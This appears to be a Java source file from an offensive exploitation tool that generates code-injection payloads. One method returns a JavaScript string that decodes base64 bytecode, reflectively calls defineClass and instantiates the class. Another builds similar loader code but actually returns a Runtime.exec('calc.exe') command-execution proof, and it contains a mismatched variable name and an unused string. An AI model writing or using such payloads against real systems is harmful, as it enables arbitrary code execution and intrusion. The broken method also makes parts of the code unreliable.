package com.h2tg.ysogate.controller.bypass;

import javax.el.ELProcessor;
import java.util.Base64;

public class EvalConverter
{

    public static String LoadByJshell(String b64)
    {
        String javacode = "" +
                "System.out.println(\\\"123\\\");"+
                "ClassLoader classLoader = Thread.currentThread().getContextClassLoader();" +
                "String b64=\\\"" +b64+"\\\";" +
                "byte[] bytes = Base64.getDecoder().decode(b64);" +
                "classloader.defineClass(bytes, 0, bytes.length);";
        String cmd="Runtime.getRuntime().exec(\\\"calc.exe\\\");";
        return cmd;
    }

    public static String LoadByJS(String b64)
    {
        return "var bytes = java.util.Base64.getDecoder().decode('" + b64 + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";
    }

    public static void main(String[] args)
    {
    }

}
